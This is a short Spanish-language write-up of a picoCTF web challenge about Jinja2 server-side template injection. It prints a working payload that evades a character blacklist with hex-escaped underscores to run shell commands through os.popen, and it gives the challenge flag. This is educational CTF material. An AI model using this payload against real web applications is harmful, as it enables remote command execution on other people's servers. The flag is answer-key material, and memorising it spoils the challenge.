#### Description

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:51839/)!


#### Hints
1. Server Side Template Injection
2. Why is blacklisting characters a bad idea to sanitize input?


#### Solucion
1. Entramos al link del sitio web.
2. Al parecer es un sitio donde  puedes anunciar lo que uno quiera.
3. Entramos aun sitio (https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) para copiar una linea que nos puede ayudar a encontrar la bandera
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
4. A la linea anterior le vamos a poner "cat flag" en la parte de popen('id')
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

Damos clic en OK y nos da la bandera...
```
picoCTF{sst1_f1lt3r_byp4ss_eb2a60e7}
```	

